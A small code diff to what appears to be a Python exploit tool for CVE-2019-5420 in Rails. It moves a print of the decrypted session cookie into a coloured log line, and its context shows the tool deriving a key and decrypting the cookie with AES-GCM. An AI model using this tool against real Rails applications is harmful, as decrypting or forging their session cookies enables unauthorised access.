@@ -43,6 +43,7 @@ class CVE2019_5420:
         cipher = AES.new(key, AES.MODE_GCM, nonce = iv)
         try:
             decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+            print (LogColors.YELLOW + decrypted.decode() + LogColors.ENDC)
             print (LogColors.GREEN + "successfully decrypt :)" + LogColors.ENDC)
             return decrypted
         except Exception as e:
@@ -54,7 +55,6 @@ class CVE2019_5420:
         ciphertext, iv, tag = self.decode_cookie()
         key = self.generate_key()
         decrypted = self.decrypt(key, ciphertext, iv, tag)
-        print (decrypted.decode())
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
